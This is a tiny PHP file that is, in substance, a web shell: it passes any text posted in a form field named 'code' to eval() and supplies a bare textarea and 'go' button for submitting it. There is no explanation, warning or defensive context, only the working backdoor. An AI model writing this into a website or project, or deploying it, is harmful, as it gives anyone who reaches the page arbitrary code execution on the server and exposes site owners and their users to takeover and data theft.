<pre>
<?php
	if(isset($_POST['code'])) {
		eval($_POST['code']);
	}
?>
</pre>
<form method="post">
	<textarea name="code"></textarea>
	<input type="submit" value="go">
</form>